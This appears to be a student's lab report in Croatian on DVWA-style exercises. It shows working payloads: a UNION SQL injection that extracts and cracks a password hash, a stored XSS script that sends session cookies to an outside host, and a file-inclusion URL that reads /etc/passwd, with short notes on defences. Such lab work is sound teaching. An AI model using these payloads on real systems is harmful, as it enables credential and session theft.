ZAD 2:
  na web aplikaciji otvaram stavku "SQL Injection"
  u polje za unos unosom "4" dobivam sljedeći crveni ispis 
  "
  ID: 4
  First name: Pablo
  Surname: Picasso
  "


  UNION napada: koristimo SQL UNION operator da bi spojili rezultat originalnog upita s rezultatima svog upita. Ovo nam može omogućiti pristup
  podacima iz tablica koje nisu dio originalnog upita, bitno je napomenuti da bi UNION napad uspio oba upita moraju vratiti jednak red stupaca.

  Unosom upita "' UNION select user, password from users where user_id=4 # " dobivam crveni ispis
  "
  ID: ' UNION select user, password from users where user_id=4 # 
  First name: pablo
  Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
  "
  ovu vrijednost [0d107d09f5bbe40cade3de5c71e9e9b7] tretiram kao hash password-a te njega pohranjujem u datoteku preko terminala (virtualna mašina) 
  naredbom "echo "0d107d09f5bbe40cade3de5c71e9e9b7" > hashes.txt", 
  putanja na kojoj je ova datoteka napravljena kod mene je ("student@mmubuntu:~$ pwd") [/home/student]

  koristeći web stranicu (https://www.md5online.org/md5-decrypt.html) za dekriptiranje MD5 hash otkrivam da je šifra  [letmein]
  
ZAD 3:
  na web aplikaciji otvaram stavku "XSS (Stored)"
  alert: u polje messagea dodajemo text "", pritiskom na "Sign Guestbook" ovaj kod se izvršava te nam se prikazuje alert box 
  s porukom "PHPSESSID=b741sql48s4b3er65k5qst59h3; security=low".

  Za izvršavanje zadnjeg dijela zadatka u message prosljeđujemo poruku oblika 
  "<script> window.location='http://public.tel.fer.hr/sui?cookie=' + encodeURIComponent(document.cookie); </script>".
  Ovdje smo morali napraviti jedan korak ispred a to je da pomoću DeveloperTools-a 
  editiramo html tako da je u message moguće pisati dovoljno znakova za izvršavanje ove funkcije npr
  "<textarea name="mtxMessage" cols="50" rows="3" maxlength="500"></textarea>".
  pritiskom na "Sign Guestbook" redirektani smo na stranciu 
  "http://public.tel.fer.hr/sui/?cookie=PHPSESSID%3Db741sql48s4b3er65k5qst59h3%3B%20security%3Dlow"

  Aplikaciju bi zaštitio npr koristeći Izlazno kodiranje:
  Izlazno kodiranje osigurava da se unos korisnika interpretira točno kako je unesen, bez izvršavanja. Na primjer, HTML entiteti poput 
  "<" i ">" trebaju biti kodirani kao &lt; i &gt; kako bi se spriječilo izvršavanje skripti.

ZAD 4.
  na web aplikaciji otvaram stavku "File Inclusion"
  vidimo da se otvaranjem pojedinog fila zapravo updatea link npr. za file "file1.php" link izgleda ovako 
  "http://192.168.56.101/vulnerabilities/fi/?page=file1.php" stoga pokušavamo nekakvu sličan link koja bi nam omogućio
  ispis datoteke koju mi želimo u ovom slučaju "/etc/passwd" što uspijevamo postići unosom linka
  "http://192.168.56.101/vulnerabilities/fi/?page=/etc/passwd" 

  Aplikaciju bi zaštitio npr tako da je Web server konfiguriran na takav način, da ograniči koje datoteke može
  poslužiti. Na primjer, ne bi trebao biti dozvoljen pristup datotekama izvan određenog direktorija.
